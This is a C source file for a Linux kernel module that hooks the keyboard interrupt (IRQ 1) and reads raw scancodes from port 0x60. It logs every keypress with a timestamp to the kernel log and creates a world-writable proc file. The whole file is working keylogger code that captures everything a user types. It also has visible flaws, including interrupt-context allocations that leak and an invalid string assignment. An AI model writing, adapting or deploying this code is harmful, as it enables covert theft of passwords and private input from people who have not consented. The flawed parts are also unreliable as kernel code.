#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include<linux/slab.h>
#include <asm/uaccess.h>
#include<linux/net.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include<linux/seq_file.h>

#define MY_WORK_QUEUE_NAME "WQsched.c"

bool caps=false;
bool shift=false;
char USER_TIME[11]="###:##:###";

static struct workqueue_struct *my_workqueue;

typedef struct {
  struct work_struct my_work;
  int    x;
} my_work_t;
my_work_t *work;

static char *str = NULL;

void print_time(char char_time[]);
void print_time(char []);

static const char *keycodes[] =
{
    "RESERVED","ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0","-", "=", "BACKSPACE",
    "TAB", "q", "w", "e", "r", "t", "y", "u", "i","o", "p", "[", "]","ENTER",
    "L_CTRL","a", "s", "d", "f", "g", "h","j", "k", "l", ";", "'","`","L_SHIFT","\\",
    "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "R_SHIFT","Gray *","Left Alt","Space","CapsLock"
};
static const char *shifted_keycodes[] =
{
    "RESERVED","ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_", "+", "BACKSPACE",
    "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I","O", "P", "{", "}","ENTER",
    "L_CTRL","A", "S", "D", "F", "G", "H","J", "K", "L", ":", "\"","~","L_SHIFT","|",
    "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?", "R_SHIFT","Gray *","Left Alt","Space","CapsLock"
};
static const char *cap_keycodes[] =
{
    "RESERVED","ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0","-", "=", "BACKSPACE",
    "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I","O", "P", "[", "]","ENTER",
    "L_CTRL","A", "S", "D", "F", "G", "H","J", "K", "L", ";", "'","`","L_SHIFT","\\",
    "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "R_SHIFT","Gray *","Left Alt","Space","CapsLock"
};

static int my_proc_show(struct seq_file *m,void *v){
	seq_printf(m,"yess");
	return 0;
}

static ssize_t my_proc_write(struct file* file,const char __user *buffer,size_t count,loff_t *f_pos)
{
	char *tmp = kzalloc((count+1),GFP_KERNEL);
	if(!tmp)return -ENOMEM;
	if(copy_from_user(tmp,buffer,count))
	{
		kfree(tmp);
		return EFAULT;
	}
	kfree(str);
	str=tmp;
	return count;
}

static int my_proc_open(struct inode *inode,struct file *file){
	return single_open(file,my_proc_show,NULL);
}

void print_time(char char_time[])
{
	struct timeval my_tv;
	int sec, hr, min, tmp1, tmp2;
	int days,years,days_past_currentyear;
	int i=0,month=0,date=0;
	unsigned long get_time;

	char_time[11]="#00:00:00#";

	do_gettimeofday(&my_tv);
	get_time = my_tv.tv_sec;
	printk(KERN_ALERT "\n %ld",get_time);
	get_time = get_time + 43200;

	sec = get_time % 60;
	tmp1 = get_time / 60;
	min = tmp1 % 60;
	tmp2 = tmp1 / 60;
	hr = (tmp2+4) % 24;
	hr=hr+1;
	
	loff_t pos = 0;

	char_time[1]=(hr/10)+48;
	char_time[2]=(hr%10)+48;
	char_time[4]=(min/10)+48;
	char_time[5]=(min%10)+48;
	char_time[7]=(sec/10)+48;
	char_time[8]=(sec%10)+48;
	char_time[10]='\0';

	days = (tmp2+4)/24;
	days_past_currentyear = days % 365;
	years = days / 365;
	
	for(i=1970;i<=(1970+years);i++)
	{
			if ((i % 4) == 0)
				days_past_currentyear--;
	}
	if((1970+years % 4) != 0)
	{
		if(days_past_currentyear >=1 && days_past_currentyear <=31)
		{
			month=1;
			date = days_past_currentyear;
		}
		else if (days_past_currentyear >31 && days_past_currentyear <= 59)
		{
			month = 2;
			date = days_past_currentyear - 31;
		}
		else if (days_past_currentyear >59 && days_past_currentyear <= 90)
		{
			month = 3;
			date = days_past_currentyear - 59;
		}
		else if (days_past_currentyear >90 && days_past_currentyear <= 120)
		{
			month = 4;
			date = days_past_currentyear - 90;
		}
		else if (days_past_currentyear >120 && days_past_currentyear <= 151)
		{
			month = 5;
			date = days_past_currentyear - 120;
		}
		else if (days_past_currentyear >151 && days_past_currentyear <= 181)
		{
			month = 6;
			date = days_past_currentyear - 151;
		}
		else if (days_past_currentyear >181 && days_past_currentyear <= 212)
		{
			month = 7;
			date = days_past_currentyear - 181;
		}
		else if (days_past_currentyear >212 && days_past_currentyear <= 243)
		{
			month = 8;
			date = days_past_currentyear - 212;
		}
		else if (days_past_currentyear >243 && days_past_currentyear <= 273)
		{
			month = 9;
			date = days_past_currentyear - 243;
		}
		else if (days_past_currentyear >273 && days_past_currentyear <= 304)
		{
			month = 10;
			date = days_past_currentyear - 273;
		}
		else if (days_past_currentyear >304 && days_past_currentyear <= 334)
		{
			month = 11;
			date = days_past_currentyear - 304;
		}
		else if (days_past_currentyear >334 && days_past_currentyear <= 365)
		{
			month = 12;
			date = days_past_currentyear - 334;
		}
		printk(KERN_INFO "Date: %d.%d.%d \t Time: %d:%d:%d\n",month,date,(1970+years),(hr-1),min,sec);
	}	
	else
	{
		if(days_past_currentyear >=1 && days_past_currentyear <=31)
		{
			month=1;
			date = days_past_currentyear;
		}
		else if (days_past_currentyear >31 && days_past_currentyear <= 60)
		{
			month = 2;
			date = days_past_currentyear - 31;
		}
		else if (days_past_currentyear >60 && days_past_currentyear <= 91)
		{
			month = 3;
			date = days_past_currentyear - 60;
		}
		else if (days_past_currentyear >91 && days_past_currentyear <= 121)
		{
			month = 4;
			date = days_past_currentyear - 91;
		}
		else if (days_past_currentyear >121 && days_past_currentyear <= 152)
		{
			month = 5;
			date = days_past_currentyear - 121;
		}
		else if (days_past_currentyear >152 && days_past_currentyear <= 182)
		{
			month = 6;
			date = days_past_currentyear - 152;
		}
		else if (days_past_currentyear >182 && days_past_currentyear <= 213)
		{
			month = 7;
			date = days_past_currentyear - 182;
		}
		else if (days_past_currentyear >213 && days_past_currentyear <= 244)
		{
			month = 8;
			date = days_past_currentyear - 213;
		}
		else if (days_past_currentyear >244 && days_past_currentyear <= 274)
		{
			month = 9;
			date = days_past_currentyear - 244;
		}
		else if (days_past_currentyear >274 && days_past_currentyear <= 305)
		{
			month = 10;
			date = days_past_currentyear - 274;
		}
		else if (days_past_currentyear >305 && days_past_currentyear <= 335)
		{
			month = 11;
			date = days_past_currentyear - 305;
		}
		else if (days_past_currentyear >335 && days_past_currentyear <= 366)
		{
			month = 12;
			date = days_past_currentyear - 335;
		}
		printk(KERN_INFO "Date:%d.%d.%d \t Time:  %d:%d:%d \t",month,date,(1970+years),(hr-1),min,sec);
	}
}
static void got_char(struct work_struct *work)
{
	
	char scancode;
        scancode = inb(0x60);
	
	if(scancode>0 && shift==false)
	{
		print_time(USER_TIME);
		
		if(caps)
		{
			printk(KERN_INFO "Key %s Pressed",cap_keycodes[scancode]);
		}
		else
		{
			if(scancode!=42 && scancode!=54)
			{			
				printk(KERN_INFO "Key %s Pressed",keycodes[scancode]);
			}
		}
		if(scancode==58)
		{
			if(caps==true)
			{
				caps=false;
			}
			else
			{
				caps=true;
			}
		}
		if(scancode==42 || scancode==54)
		{			
			shift=true;
		}		
		
	}
	if(scancode>0 && shift==true)
	{
		print_time(USER_TIME);
		
		if(caps)
		{
			printk(KERN_INFO "Key %s Pressed",keycodes[scancode]);
		}
		else
		{
			printk(KERN_INFO "Key %s Pressed",shifted_keycodes[scancode]);
		}
		if(scancode==58)
		{
			if(caps==true)
			{
				caps=false;
			}
			else
			{
				caps=true;
			}
		}
	}
	if(scancode==-86)
	{
		printk(KERN_INFO "Key L_SHIFT Released");
		shift=false;
	}
	if(scancode==-74)
	{
		printk(KERN_INFO "Key R_SHIFT Released");
		shift=false;
	}
}
irqreturn_t irq_handler(int irq, void *dev_id)
{
	work = (my_work_t *)kmalloc(sizeof(my_work_t), GFP_KERNEL);
	
	INIT_WORK((struct work_struct *)work, got_char);

	queue_work(my_workqueue, (struct work_struct *)work);

	return IRQ_HANDLED;
}

static struct file_operations my_fops={
	.owner = THIS_MODULE,
	.open = my_proc_open,
	.release = single_release,
	.read = seq_read,
	.llseek = seq_lseek,
	.write = my_proc_write
};

int init_module()
{
	struct proc_dir_entry *entry;
	
	my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);
	
	free_irq(1, NULL);
	
	entry = proc_create("lkm_output.txt",0777,NULL,&my_fops);

	if(!entry)
	{
		return -1;	
	}
	else
	{
		printk(KERN_INFO "Created proc file successfully\n");
	}

	return request_irq(1,irq_handler,IRQF_SHARED, "test_keyboard_irq_handler",(void *)(irq_handler));
}

void cleanup_module()
{
	free_irq(1, NULL);
}
MODULE_LICENSE("GPL");
                
